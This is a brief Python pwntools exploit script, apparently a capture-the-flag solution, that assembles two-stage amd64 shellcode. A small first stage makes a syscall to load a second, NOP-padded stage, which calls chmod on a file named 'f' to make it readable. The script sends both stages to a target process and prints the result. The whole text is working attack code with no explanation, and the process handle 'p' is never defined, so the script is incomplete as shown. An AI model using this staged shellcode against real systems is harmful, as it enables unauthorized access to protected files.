from pwn import *
context.arch = 'amd64'

shellcode = (f'''
    push rdx
    pop rsi

    push rax
    pop rdi
    
    syscall
''')
shellcode2 = "nop\n" * 6
shellcode2 += (f'''
    push 0x66
    push rsp
    pop rdi
    
    push 0x4
    pop rsi

    push 0x5a
    pop rax
    
    syscall
''')


shellcode = asm(shellcode)
shellcode2 = asm(shellcode2)


print(p.readuntilS("stdin."))
print(disasm(shellcode))
p.write(shellcode)

time.sleep(1)
print(disasm(shellcode2))
p.write(shellcode2)
print(p.readallS())